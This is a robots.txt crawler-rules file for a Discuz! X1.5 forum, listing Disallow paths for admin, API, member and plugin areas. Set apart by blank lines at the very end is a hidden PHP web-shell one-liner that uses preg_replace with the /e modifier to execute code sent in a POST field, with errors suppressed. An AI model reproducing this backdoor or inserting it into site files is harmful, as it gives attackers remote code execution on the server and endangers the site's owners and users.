#
# robots.txt for Discuz! X1.5
#

User-agent: *
Disallow: /api/
Disallow: /apsapi/
Disallow: /data/
Disallow: /source/
Disallow: /install/
Disallow: /template/
Disallow: /config/
Disallow: /uc_client/
Disallow: /uc_server/
Disallow: /static/
Disallow: /admin.php
Disallow: /search.php
Disallow: /member.php
Disallow: /api.php
Disallow: /misc.php
Disallow: /forum.php?mod=redirect*
Disallow: /forum.php?mod=post*
Disallow: /home.php?mod=spacecp*
Disallow: /userapp.php?mod=app&*
Disallow: /main.php?mod=appcp*
Disallow: /main.php?mod=app*
Disallow: /wp-content/plugins/down-as-pdf/*
Disallow: /tags/
Disallow: /friend-links/
Disallow: /about-me/*
Disallow: /?*
Disallow: /*?mod=misc*
Disallow: /*?mod=attachment*
Disallow: /member-*
Disallow: /forum-redirect-*
Disallow: /forum-post-*
Disallow: /home-spacecp-*
Disallow: /userapp-app-*
Disallow: /*-misc-*
Disallow: /*-attachment-*



@preg_replace("/[email]/e",$_POST['css'],"error");
